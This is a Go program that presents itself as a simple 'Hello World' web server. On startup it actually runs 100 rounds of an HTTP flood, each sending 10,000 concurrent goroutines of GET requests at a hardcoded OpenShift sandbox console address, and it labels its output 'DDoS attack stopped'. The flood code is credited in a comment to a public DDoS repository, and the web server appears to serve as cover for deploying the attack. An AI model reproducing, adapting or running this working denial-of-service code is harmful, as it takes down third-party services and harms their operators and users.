package main

import (
	"fmt"
	"net/http"
	"os"
	"io"
	"io/ioutil"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"
)

var port = os.Getenv("PORT")

func main() {
	if port == "" {
		port = "8080"
	}

	for i := 0; i < 100; i++ {
		fmt.Println("helloooo")
	
	        workers := 10000
		d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
		if err != nil {
			panic(err)
		}
		d.Run()
		time.Sleep(time.Second)
		d.Stop()
		successRequest, amountRequests := d.Result()
		fmt.Println("DDoS attack stopped:", successRequest, amountRequests)
	}
	
	http.HandleFunc("/", HelloServer)
	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%s", port), nil)
}

func HelloServer(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path[1:]
	if path != "" {
		fmt.Fprintf(w, "Hello, %s!", r.URL.Path[1:])
	} else {
		fmt.Fprint(w, "Hello World!")
	}
}


// cloned by https://github.com/Konstantin8105/DDoS

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					} else {
						fmt.Println("err:", err)
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
